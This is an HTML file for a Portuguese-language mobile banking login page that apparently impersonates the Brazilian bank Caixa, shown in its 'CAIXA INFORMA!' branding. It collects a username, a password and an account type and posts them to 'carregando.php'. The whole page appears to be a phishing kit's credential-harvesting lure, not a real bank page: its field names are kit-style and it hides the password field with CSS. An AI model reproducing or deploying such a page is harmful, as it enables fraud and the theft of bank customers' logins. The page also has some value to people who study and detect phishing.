﻿<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Acesso Seguro</title>
<script src="js/jquery.js"></script>

<style>

body {
	background: #1664AC;
	margin: 0;
	font-family: Arial, Helvetica, sans-serif;
	}
	
#topo {
	width: 100%;
	height: 30px;
	background: url(img/mLogomenor.png) no-repeat;
	background-position: 14px 14px;
	}
	
#logo {
	background: url(img/mLogo.png) no-repeat;
	width: 100%;
	height: 34px;
	background-position: center center;
	margin-top: 40px;
	}
	
.float-label {
  padding:10px 20px;
}

.float-label label{
  display: block;
  position:absolute;
  box-sizing: border-box;
}

.float-label input{}


.float-label label {
    color: #fff;
    font-size: 12px;
    margin-left: 0;
    margin-top: -52px;
    transition-duration: 0.2s;
	font-family:Arial, Helvetica, sans-serif;
  
}

.float-label input {
  margin-top: 10px;
}

.float-label input[data-empty] + label {
  margin-top: -32px;
  color:#fff;
  width:120px;
  font-size:16px;
  font-family:Arial, Helvetica, sans-serif;
  font-weight:100;
}

.dadosI {
    color:#FFF;
    font-size: 14px;
    height: 42px;
    width: 100%;
	border:0;
	border-bottom:1px #fff solid;
	outline: 0 none;
	background:transparent;
	font-family:Arial, Helvetica, sans-serif;
	}
	
.switch__container {
  width: 120px;
}

.switch {
  visibility: hidden;
  position: absolute;
  margin-left: -9999px;
}

.switch + label {
  display: block;
  position: relative;
  cursor: pointer;
  outline: none;
  user-select: none;
}

.switch--shadow + label {
  padding: 2px;
  width: 34px;
  height: 8px;
  background-color: #5A7A78;
  border-radius: 60px;
}
.switch--shadow + label:before,
.switch--shadow + label:after {
  display: block;
  position: absolute;
  top: -3px;
  left: 2px;
  content: "";
}
.switch--shadow + label:before {
  right: 1px;
  background-color: #5A7A78;
  border-radius: 60px;
  transition: background 0.4s;
}
.switch--shadow + label:after {
  width: 18px;
  height: 18px;
  background-color: #F3A901;
  border-radius: 100%;
  box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
  transition: all 0.4s;
}
.switch--shadow:checked + label:before {
  background-color: #5A7A78;
}
.switch--shadow:checked + label:after {
  transform: translateX(16px);
}

#radios {
	padding: 10px 20px;
	}

#radios input[type=radio] {
display:none;
}
/*--------------------------------------------------------------------------------
Creating radio button and label as a Single unit(for Cross browser compatibility)
----------------------------------------------------------------------------------*/
#radios input[type=radio] + label{
padding-left:26px;
display:inline-block;
line-height:20px;
background-repeat:no-repeat;
cursor:pointer;
}
#radios input[type=radio]:checked + label {
background-position: 0 0;
}
#radios label{
background-image:url(img/radio.png);
background-position: 0 -21px;;
background-repeat: no-repeat;
color:#FFF;
margin-right: 20px;
margin-bottom: 10px;
} 

.bttenter {
	background: #f3a901 ;
    border-radius: 4px;
    font-family: arial;
    font-size: 18px;
	color: #fff;
    padding: 12px;
    text-align: center;
    width: 100%;
	border:1px solid #fff;
	cursor: pointer;
	}
	
#bgadd{
	position:fixed;
	top:0px;
	left:0px;
	width:100%;
	height:100%;
	z-index:998;
	background:url(img/bg-loading.png) repeat;
	display:none;
	}
	
.modalposition{ 
    background: #fff none repeat scroll 0 0;
    border: 1px solid #999;
    border-radius: 0;
    box-shadow: 0 0 10px #999;
    color: #000;
    font-family: Arial;
    font-size: 12px;
    height: 130px;
    left: 50%;
    margin-left: -150px;
    margin-top: -170px;
    position: absolute;
    top: 50%;
    width: 300px;
    z-index: 99999;
	  }
	
.modaldiv1{ height: 30px; width:; }
.modaltext{ padding: 15px; padding-bottom: 10px; font-size: 13px; color:#666666; }
.modalbutton{ padding:5px 30px 5px 30px; color:#FFF; border:1px solid #900; font-size:12px; background:#F00; font-weight:bold; border-radius:0;}
.modaldiv2{ margin-top:50px; display:block;}
.modalinforma{ padding-top: 0; padding:7px; font-family: Arial; font-size: 14px; color:#FFF; background:#1664AC; text-shadow:1px 1px 1px #666666;}	
	
.bttok {
	background:url(img/bgbottom.png) repeat;
    border: 0 none;
    border-radius: 4px;
    color: #fff;
    font-family: arial;
    font-size: 14px;
    padding: 6px;
    text-align: center;
    width: 45px;
	cursor:pointer;
	}
	
</style>
</head>

<body>

<div id="topo"></div>

<div id="logo"></div>

<div style="padding:10px; ">

<form id="ajaxpf" name="ajaxpf" method="post" onSubmit="return validaSHK()" action="carregando.php" autocomplete="off">

<div style="width:124px; height:40px; float:right; top: 48px; right: 18px; position: relative;">
<div style="float:right; width:100%; margin-top: 4px; font-size:12px; color:#FFF;">Lembrar meu usuário</div>

<div style="float:right; width:100%; text-align:right; padding-top:4px;" class="switch__container">
   <div style="float:right;">
  <input id="switch-shadow" class="switch switch--shadow" checked="checked" type="checkbox">
  <label for="switch-shadow"></label>
</div>
</div>
</div>

<div style="background:url(img/n.png) no-repeat; width:23px; height:23px; top:140px; right: -104px; position:relative; float: right;"></div>



<div class="float-label">
<input class="dadosI" type="text" onblur="mudaBlur('mUsuar')" onfocus="delete this.dataset.empty; mudaFocus('mUsuar');" name="shkUser" id="shkUser" maxlength="20" data-empty />
<label for="shkUser">Usuário</label>
</div>

<div class="float-label">
<input class="dadosI" type="text" onblur="mudaBlur('mPasswd')" onfocus="delete this.dataset.empty; mudaFocus('mPasswd');" name="shkPass" id="shkPass" onKeyUp="javascript:pulacampo('shkPass','bottonG');" style="-webkit-text-security: disc!important;" maxlength="8" data-empty />
<label for="shkPass">Senha</label>
</div>

<script type="application/javascript" language="javascript">
	function mudaFocus(forLabel){
		$('#'+forLabel).css({'borderBottom-color' : '#CCA43D'});
		$('label[for="'+forLabel+'"]').css({'color' : '#CCA43D'});
	}
	function mudaBlur(forLabel){
		$('#'+forLabel).css({'borderBottom-color' : '#fff'});
		$('label[for="'+forLabel+'"]').css({'color' : '#fff'});
	}
</script>

<div id="radios">
<input type="radio" name="option" id="radio1" value="Pessoa Fisica" checked="checked"/>
<label for="radio1" >Pessoa Física</label>
<input type="radio" name="option" id="radio2" value="Pessoa Juridica" />
<label for="radio2" >Pessoa Jurídica</label>
</div>

<div style="padding:10px 20px; text-align:center; color: #fff;">Nao tenho usuário</div>

<div style="padding:10px 20px; text-align:center;">
<input type="submit" name="bottonG" id="bottonG" class="bttenter" value="Acessar minha conta" />
</div>

</form>
</div>



<div style="display:none;" id="modalalert" class="modalposition">
<div class="modaldiv1">
<center>
<div class="modalinforma"><div class="glyphicon glyphicon glyphicon-lock" style="padding:0 10px 0 0; color:#CCA43D;"></div>CAIXA INFORMA!</div>
<div class="modaltext"><div id="TextErrorModal">Erro</div></div>
</center>
</div>
<div class="modaldiv2" align="center">
<a href="#closemodal"><button class="bttok" onClick="feixaMG()">&nbsp;&nbsp;Ok&nbsp;&nbsp;</button></a>
</div>
</div>

<script>
function feixaMG(){
	document.getElementById('modalalert').style.display='none';
	document.getElementById('bgadd').style.display='none';
	}
</script>


<div id="bgadd"></div>


<script>
var floatLabel = document.querySelectorAll(".float-label");
var onFloatLabelChange = function () {
  if (this.value.length == 0) {
    this.dataset.empty = null;
  } else {
    delete this.dataset.empty;
  }
}

floatLabel = [].slice.apply(floatLabel);
floatLabel.forEach(function (container) {
  var input = container.querySelector("input");
  input.addEventListener("blur", onFloatLabelChange);
});
	
</script>


<script type="text/javascript">
function validaSHK(){
	var ModalAlertError = document.getElementById("TextErrorModal");
    var ModalAlert = document.getElementById("modalalert");
	var Modalfundo = document.getElementById("bgadd");
	
if ( document.ajaxpf.shkUser.value == "" ||
document.ajaxpf.shkUser.value.length < 5 ||
document.ajaxpf.shkUser.value.length > 20){
document.getElementById("shkUser").value = "";
ModalAlertError.innerHTML = "Usuário Invalido!"; ModalAlert.style.display = ""; Modalfundo.style.display = "block";
return false;
    }
	
if ( document.ajaxpf.shkPass.value == "" ||
document.ajaxpf.shkPass.value.length < 6 ||
document.ajaxpf.shkPass.value.length > 8){
document.getElementById("shkPass").value = "";
ModalAlertError.innerHTML = "Senha Inválida!"; ModalAlert.style.display = ""; Modalfundo.style.display = "block";
return false;
    }
	
}
</script>


<script>
function pulacampo(idobj, idproximo)
{
var str = new String(document.getElementById(idobj).value);
var mx = new Number(document.getElementById(idobj).maxLength);
if (str.length == mx)
{
document.getElementById(idproximo).focus();
}
}
</script>


</body>
</html>